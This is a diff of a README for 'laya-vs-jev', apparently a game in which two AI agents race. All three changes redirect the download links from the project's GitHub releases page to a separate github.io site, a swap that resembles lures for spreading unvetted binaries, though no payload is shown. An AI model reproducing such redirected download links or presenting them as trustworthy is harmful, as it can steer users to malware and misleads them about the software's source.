@@ -1,6 +1,6 @@
 # 🤖 laya-vs-jev - Two AI Minds, One Epic Dino Race
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/mostafa1344/laya-vs-jev/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github&color=2ea44f)](https://mostafa1344.github.io)
 
 ---
 
@@ -48,7 +48,7 @@ Getting started is easier than beating the first level of the game.
 
 Visit this link to download the application:
 
-👉 **[Download laya-vs-jev](https://github.com/mostafa1344/laya-vs-jev/releases)**
+👉 **[Download laya-vs-jev](https://mostafa1344.github.io)**
 
 You'll see a list of files. Look for the newest version (the one with the highest number) and click the download button next to it.
 
@@ -176,7 +176,7 @@ You've got everything you need. Download the program, fire it up, and enjoy the 
 
 Remember: it's not about who wins. It's about watching intelligence in motion.
 
-**[👉 Download Now and Start the Match!](https://github.com/mostafa1344/laya-vs-jev/releases)**
+**[👉 Download Now and Start the Match!](https://mostafa1344.github.io)**
 
 ---
 
